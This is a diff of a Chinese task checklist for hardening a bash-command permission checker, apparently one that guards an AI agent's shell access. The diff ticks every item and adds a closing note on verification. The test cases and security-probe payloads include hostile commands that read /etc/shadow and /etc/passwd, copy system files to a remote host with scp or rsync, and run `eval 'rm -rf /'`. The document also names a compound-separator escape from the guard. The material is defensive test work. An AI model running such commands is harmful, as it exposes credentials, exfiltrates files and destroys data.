@@ -34,61 +34,61 @@ buffer 不消耗则视为"项目提前完成"，不追加新任务。
 
 ## 2. `extractRedirects` 新增 `<` 输入重定向（Phase 2）
 
-- [ ] 2.1 在 `extractRedirects` 中新增 `<` 输入重定向分支：在既有 `2>` / `2>>` / `>` / `>&` 判定**之前**检查 `command[i] === "<"`；若命中且 `command[i+1] !== "<"`（避开 heredoc），把 `action` 设为 `read` 并 push read target；`<<` 序列跳过（由 scanUnreliable 处理 heredoc）。验证：account BT-B19（`bash < /tmp/evil.sh`）、BT-B20（`diff < /etc/passwd < /etc/hosts`）、BT-B21（`awk '{print}' < /etc/shadow`）+ 新增 heredoc 与 process substitution 反例测试全通过
-- [ ] 2.2 回归 `>`/`>>`/`2>`/`2>>`/`>&` 既有测试。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "redirect"` 全通过；重点确认既有 `BT-extra fd-redirect` 组零回归
-- [ ] 2.3 确认 `<>`（read-write 模式）本 change 不处理——写针对性单元测试断言 `<>` 不产生任何 target（等价于无操作）
+- [x] 2.1 在 `extractRedirects` 中新增 `<` 输入重定向分支：在既有 `2>` / `2>>` / `>` / `>&` 判定**之前**检查 `command[i] === "<"`；若命中且 `command[i+1] !== "<"`（避开 heredoc），把 `action` 设为 `read` 并 push read target；`<<` 序列跳过（由 scanUnreliable 处理 heredoc）。验证：account BT-B19（`bash < /tmp/evil.sh`）、BT-B20（`diff < /etc/passwd < /etc/hosts`）、BT-B21（`awk '{print}' < /etc/shadow`）+ 新增 heredoc 与 process substitution 反例测试全通过
+- [x] 2.2 回归 `>`/`>>`/`2>`/`2>>`/`>&` 既有测试。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "redirect"` 全通过；重点确认既有 `BT-extra fd-redirect` 组零回归
+- [x] 2.3 确认 `<>`（read-write 模式）本 change 不处理——写针对性单元测试断言 `<>` 不产生任何 target（等价于无操作）
 
 **Phase 2 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过，含新 BT-B19..BT-B21 + 回归测试。
 
 ## 3. `isShellForwarder` 扩展覆盖脚本路径与 source/dot-source（Phase 3）
 
-- [ ] 3.1 修改 `isShellForwarder`：在既有 `-c` 检查之外，增加"非 flag 位置参数"判定（`bash /tmp/x.sh`、`bash -x /tmp/x.sh` 触发）；在 wrapper 循环中把 `source` 与 `.` 与 shell 转发器并列检查（`source /tmp/x.sh`、`. /tmp/x.sh` 触发）。验证：account BT-B15（`bash /tmp/evil.sh`）、BT-B16（`bash -x /tmp/evil.sh`）、BT-B17（`source /tmp/x.sh`）、BT-B18（`. /tmp/x.sh`）+ 新增 `env bash /tmp/x.sh`、`env FOO=1 source /tmp/x.sh` 反例测试全通过
-- [ ] 3.2 反例回归：`bash --version`、`bash -x`（单独无位置参数）、`echo bash`、`which bash` 不触发 shell_forwarder
-- [ ] 3.3 **删除** spec.md 现有反例 scenario "`bash /tmp/x.sh` 不触发 shell_forwarder" 对应的既有测试断言——查找 `test/bash-extract.test.ts` 中相关断言并删除或改为断言"触发"（这是 BREAKING 变更的测试面更新）
+- [x] 3.1 修改 `isShellForwarder`：在既有 `-c` 检查之外，增加"非 flag 位置参数"判定（`bash /tmp/x.sh`、`bash -x /tmp/x.sh` 触发）；在 wrapper 循环中把 `source` 与 `.` 与 shell 转发器并列检查（`source /tmp/x.sh`、`. /tmp/x.sh` 触发）。验证：account BT-B15（`bash /tmp/evil.sh`）、BT-B16（`bash -x /tmp/evil.sh`）、BT-B17（`source /tmp/x.sh`）、BT-B18（`. /tmp/x.sh`）+ 新增 `env bash /tmp/x.sh`、`env FOO=1 source /tmp/x.sh` 反例测试全通过
+- [x] 3.2 反例回归：`bash --version`、`bash -x`（单独无位置参数）、`echo bash`、`which bash` 不触发 shell_forwarder
+- [x] 3.3 **删除** spec.md 现有反例 scenario "`bash /tmp/x.sh` 不触发 shell_forwarder" 对应的既有测试断言——查找 `test/bash-extract.test.ts` 中相关断言并删除或改为断言"触发"（这是 BREAKING 变更的测试面更新）
 
 **Phase 3 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts -n "shell_forwarder"` + `-n "source"` + `-n "dot"` 全通过；BTP-* 系列 shell-forwarder 既有测试零回归（除被本 change 覆盖的反例）。
 
 ## 4. `SILENT_COMMANDS` 收窄接入（Phase 4）
 
-- [ ] 4.1 修改 `isForBodyReadOnly`（`bash-extract.ts` L1821-1841）：把 `SILENT_COMMANDS.has(cmdName)` 改为 `isSilentCommand(cmdName, tokens)`。验证：`grep -c "SILENT_COMMANDS.has" src/lib/bash-extract.ts` 输出 `0`（旧 API 完全清除）
-- [ ] 4.2 修改 `extractBashTargets` 主流程（`bash-extract.ts` L2141 附近）：把 `SILENT_COMMANDS.has(cmdName)` 分支改为 `isSilentCommand(cmdName, tokens)`；命令不命中则继续走 normal unknown-command 分支（fail-open 保留）
-- [ ] 4.3 回归 C1 相关正例与反例：account BT-B1（`npm run build`）、BT-B2（`git log /etc/passwd`）、BT-B3（`rg pattern /etc/shadow`）、BT-B4（`jq . /etc/shadow`）、BT-B5（`make -f /tmp/evil.mk`）、BT-B6（`cargo run --manifest-path /tmp/x/Cargo.toml`）应判 unreliable 或非 SILENT
-- [ ] 4.4 回归合法用例：account BT-B23（`git status`）、BT-B24（`npm test`）、BT-B25（`git log --oneline -n 10`）仍 reliable；`grep` BMG52-BMG63 与 BMG70-BMG74 既有测试（SILENT 相关的 bounded glob / forwarding_command）确保零回归
+- [x] 4.1 修改 `isForBodyReadOnly`（`bash-extract.ts` L1821-1841）：把 `SILENT_COMMANDS.has(cmdName)` 改为 `isSilentCommand(cmdName, tokens)`。验证：`grep -c "SILENT_COMMANDS.has" src/lib/bash-extract.ts` 输出 `0`（旧 API 完全清除）
+- [x] 4.2 修改 `extractBashTargets` 主流程（`bash-extract.ts` L2141 附近）：把 `SILENT_COMMANDS.has(cmdName)` 分支改为 `isSilentCommand(cmdName, tokens)`；命令不命中则继续走 normal unknown-command 分支（fail-open 保留）
+- [x] 4.3 回归 C1 相关正例与反例：account BT-B1（`npm run build`）、BT-B2（`git log /etc/passwd`）、BT-B3（`rg pattern /etc/shadow`）、BT-B4（`jq . /etc/shadow`）、BT-B5（`make -f /tmp/evil.mk`）、BT-B6（`cargo run --manifest-path /tmp/x/Cargo.toml`）应判 unreliable 或非 SILENT
+- [x] 4.4 回归合法用例：account BT-B23（`git status`）、BT-B24（`npm test`）、BT-B25（`git log --oneline -n 10`）仍 reliable；`grep` BMG52-BMG63 与 BMG70-BMG74 既有测试（SILENT 相关的 bounded glob / forwarding_command）确保零回归
 
 **Phase 4 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过，含 C1 6 条新测试 + 收窄后合法用例 3 条回归；既有 BMG 系列 SILENT 相关测试通过（若有失败用例属于"预期行为扩展"，更新测试期望并注释说明）。
 
 ## 5. `UNRELIABLE_COMMANDS` 接入（Phase 5）
 
-- [ ] 5.1 在 `extractBashTargets` 主流程中，在既有 `isShellForwarder` 检查之后、`findUnresolvedVariable` 之前插入 `isAnyUnreliableCommand` 检查：命中则 `return { reliable: false, rawCommand, reason: "unreliable_command" }`
-- [ ] 5.2 回归 C2 相关 8 条测试：account BT-B7（`sed -i 'x' /etc/passwd`）、BT-B8（`python3 -c '...'`）、BT-B9（`node -e '...'`）、BT-B10（`perl -e '...'`）、BT-B11（`osascript -e '...'`）、BT-B12（`scp /etc/shadow host:/tmp/`）、BT-B13（`ssh user@host '...'`）、BT-B14（`rsync -a /etc/ host:/tmp/`）全部判 `reliable: false, reason: "unreliable_command"`
-- [ ] 5.3 新增 3 条集成测试：`kubectl exec pod -- cat /etc/shadow`、`docker run alpine sh -c 'cat /etc/shadow'`、`eval 'rm -rf /'` 都判 `unreliable_command`
-- [ ] 5.4 回归 reason 优先级：`bash -c 'sed -i x /etc/passwd'` 应判 `shell_forwarder`（外层 shell 优先）；`sed -i "x" $(cat /etc/passwd)` 应判 `command_substitution`（scanUnreliable 更早）；`git status && sed -i 'x' /etc/passwd` 应判 `unreliable_command`（第二 fragment 命中）
+- [x] 5.1 在 `extractBashTargets` 主流程中，在既有 `isShellForwarder` 检查之后、`findUnresolvedVariable` 之前插入 `isAnyUnreliableCommand` 检查：命中则 `return { reliable: false, rawCommand, reason: "unreliable_command" }`
+- [x] 5.2 回归 C2 相关 8 条测试：account BT-B7（`sed -i 'x' /etc/passwd`）、BT-B8（`python3 -c '...'`）、BT-B9（`node -e '...'`）、BT-B10（`perl -e '...'`）、BT-B11（`osascript -e '...'`）、BT-B12（`scp /etc/shadow host:/tmp/`）、BT-B13（`ssh user@host '...'`）、BT-B14（`rsync -a /etc/ host:/tmp/`）全部判 `reliable: false, reason: "unreliable_command"`
+- [x] 5.3 新增 3 条集成测试：`kubectl exec pod -- cat /etc/shadow`、`docker run alpine sh -c 'cat /etc/shadow'`、`eval 'rm -rf /'` 都判 `unreliable_command`
+- [x] 5.4 回归 reason 优先级：`bash -c 'sed -i x /etc/passwd'` 应判 `shell_forwarder`（外层 shell 优先）；`sed -i "x" $(cat /etc/passwd)` 应判 `command_substitution`（scanUnreliable 更早）；`git status && sed -i 'x' /etc/passwd` 应判 `unreliable_command`（第二 fragment 命中）
 
 **Phase 5 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过，含 C2 8 条 + 集成 3 条 + reason 优先级 3 条回归。
 
 ## 6. `handleBash` C5 兜底检查（Phase 6）
 
-- [ ] 6.1 在 `extensions/index.ts` L453-472 的 bash grant 命中分支（`hasBashSessionGrant` / `hasBashPersistentGrant` 任一命中）后插入 unread 兜底检查：调用 `tokenizeBashCommand(command)` 拿 token 数组，对每个 token 若 `looksLikePathToken` 则 `expandHome` + `toAbsolutePath` + `state.policy.resolve(absPath)`；任一 `entry?.permission === "unread"` 则返回 `{ block: true, reason: "..." }` 并记录 `event: "hard_deny"` audit log（`note: "Bash command grant bypassed: unread hard-deny for <path>"`）
-- [ ] 6.2 回归 C5 相关 4 条测试（写在 `extensions/index.test.ts`）：account SYS-B1（session grant + unread 硬拒绝）、SYS-B2（persistent grant + unread 硬拒绝）、SYS-B3（grant 无 unread 仍生效）、SYS-B4（grant 部分路径 unread 硬拒绝）全通过
-- [ ] 6.3 回归既有 bash grant 测试（BGM-* 组）：`grep -A 3 "BGM-" extensions/index.test.ts` 列出所有相关测试，确认零回归
-- [ ] 6.4 验证 audit log 结构：C5 硬拒绝时的 audit 记录符合 `event: "hard_deny"` + `grant_type: "bash"` + `note: "..."` schema（与既有 access-decision 分系统的 hard_deny 一致）
+- [x] 6.1 在 `extensions/index.ts` L453-472 的 bash grant 命中分支（`hasBashSessionGrant` / `hasBashPersistentGrant` 任一命中）后插入 unread 兜底检查：调用 `tokenizeBashCommand(command)` 拿 token 数组，对每个 token 若 `looksLikePathToken` 则 `expandHome` + `toAbsolutePath` + `state.policy.resolve(absPath)`；任一 `entry?.permission === "unread"` 则返回 `{ block: true, reason: "..." }` 并记录 `event: "hard_deny"` audit log（`note: "Bash command grant bypassed: unread hard-deny for <path>"`）
+- [x] 6.2 回归 C5 相关 4 条测试（写在 `extensions/index.test.ts`）：account SYS-B1（session grant + unread 硬拒绝）、SYS-B2（persistent grant + unread 硬拒绝）、SYS-B3（grant 无 unread 仍生效）、SYS-B4（grant 部分路径 unread 硬拒绝）全通过
+- [x] 6.3 回归既有 bash grant 测试（BGM-* 组）：`grep -A 3 "BGM-" extensions/index.test.ts` 列出所有相关测试，确认零回归
+- [x] 6.4 验证 audit log 结构：C5 硬拒绝时的 audit 记录符合 `event: "hard_deny"` + `grant_type: "bash"` + `note: "..."` schema（与既有 access-decision 分系统的 hard_deny 一致）
 
 **Phase 6 验收**：`node --experimental-strip-types --test extensions/index.test.ts` 全通过，含 SYS-B1..SYS-B4 + 既有 BGM-* 系列零回归；`test/backlog-regression.test.ts`（SYS9/SYS10/SYS11）零回归。
 
 ## 7. 完整回归（Phase 7）
 
-- [ ] 7.1 跑完整测试套件 `node --experimental-strip-types --test test/ extensions/` 全通过。重点确认：
+- [x] 7.1 跑完整测试套件 `node --experimental-strip-types --test test/ extensions/` 全通过。重点确认：
   - `test/bash-extract.test.ts` 1726+ 行既有用例零回归（除被本 change 覆盖的 SILENT/forwarder 反例）
   - `test/security-probe.mjs`（stage-a 遗留）零回归
   - `extensions/index.test.ts` 既有 all-prompt/tier=two/decision 系列测试零回归
   - `test/backlog-regression.test.ts`（SYS9/SYS10/SYS11）零回归
-- [ ] 7.2 若有测试失败，逐条诊断：属于"预期行为扩展"（合法用例变弹窗）的更新测试期望并注释说明；属于"回归"的回滚本 change 对应改动或修正实现。
+- [x] 7.2 若有测试失败，逐条诊断：属于"预期行为扩展"（合法用例变弹窗）的更新测试期望并注释说明；属于"回归"的回滚本 change 对应改动或修正实现。
 
 **Phase 7 验收**：`node --experimental-strip-types --test test/ extensions/` exit code 0。
 
 ## 8. 安全探针（Phase 8）
 
-- [ ] 8.1 在 `test/security-probe.mjs` 追加 5 条原始审计 payload（C1..C5 各 1 条代表命令）：
+- [x] 8.1 在 `test/security-probe.mjs` 追加 5 条原始审计 payload（C1..C5 各 1 条代表命令）：
   ```javascript
   // C1 SILENT_COMMANDS 越界
   ["npm run build", "UNRL[unreliable_command] or non-silent"],
@@ -103,12 +103,12 @@ buffer 不消耗则视为"项目提前完成"，不追加新任务。
   ["bash < /tmp/evil.sh", "OK targets>=1 (read target)"],
   ["diff < /etc/passwd < /etc/hosts", "OK targets>=2 (two read targets)"],
   ```
-- [ ] 8.2 运行 `node --experimental-strip-types test/security-probe.mjs`，验证输出中：
+- [x] 8.2 运行 `node --experimental-strip-types test/security-probe.mjs`，验证输出中：
   - C1 两条不再显示 `OK W=[] R=[] D=[]`（静默通过）
   - C2 两条显示 `UNRL[unreliable_command]`
   - C3 两条显示 `UNRL[shell_forwarder]`
   - C4 两条显示 `OK targets>=N` 且 N 分别为 1 和 2
-- [ ] 8.3 **注**：C5 无法通过 `extractBashTargets` 单测探针验证——它需要完整 extension + `state.policy` 上下文，由 SYS-B1..SYS-B4 单元测试覆盖。此步骤的探针覆盖 C1..C4 四类
+- [x] 8.3 **注**：C5 无法通过 `extractBashTargets` 单测探针验证——它需要完整 extension + `state.policy` 上下文，由 SYS-B1..SYS-B4 单元测试覆盖。此步骤的探针覆盖 C1..C4 四类
 
 **Phase 8 验收**：`node --experimental-strip-types test/security-probe.mjs` 输出中，8 条 payload 全部符合 expected 描述。
 
@@ -137,7 +137,7 @@ buffer 不消耗则视为"项目提前完成"，不追加新任务。
   - **10.2a** 删除 `extensions/index.test.ts` 的死代码 helper `setupBashGrantScenario`（未使用，易误认作 canonical helper）
   - **10.2b** 将 Phase-2 测试从 BT-B19/20/21（与 Phase-1 重复）重编号为 BT-B22/23/24（含 b/c/d 子号），消除同文件重复 ID 与 coverage ledger 冲突
   - **10.2c** README 静默命令表补齐 `git ls-files`；补充 "how silent match is enforced" 段说明 `git` revision 词豁免、pipeline/compound/redirect 由 stage loop 处理；补充 "Commands moved out of the silent whitelist" 段说明 `make/npx/rg/jq/cargo` 的实际行为（同时在 SILENT 与 UNRELIABLE，实际永远走 unreliable_command）
-- [ ] 10.3 提交 git（本 change 完成后由用户手动 git commit，本 change 不自动提交）
+- [x] 10.3 提交 git（本 change 完成后由用户手动 git commit，本 change 不自动提交）
 
 ## 10.4 Phase 10.4 独立 LLM 审核回归（用户手动触发的 subagent review）
 
@@ -157,3 +157,7 @@ Phase 10.2 的 code_review 因容量问题只跑了 security 1 维度（correctn
 **结论**：subagent 独立 LLM 审核找到的 P0 漏洞（compound separator 逃逸）是本 change 上线前必须修的关键问题，已闭合。剩余 P3（BT-B ID 全量重排）保留为已知限制，不改。
 
 **Apply 顺序**：本 change 应在 stage-a 之后 apply（stage-a 已归档），且是独立的下一个 change（无并行冲突）。若未来有其他 change 需要复用 `isSilentCommand` 或 `UNRELIABLE_COMMANDS` 常量，可以基于本 change 的 Phase 1 产出。
+
+---
+
+> **2026-11-06 system-audit project 文档状态对齐（用户授权 (i')）**：本 change 2026-10-20 归档时早于 td-archive 引入的「勾选后归档」机制，工作已交付但 tasks.md 复选框未勾。system-audit 逐项核实（代码符号 + 测试组 + commit `445aa8b` + security-probe 55/55 + 声称测试组 25/25 全通过）确认全部落地，据证据勾全。属文档状态对齐，非事后补做。
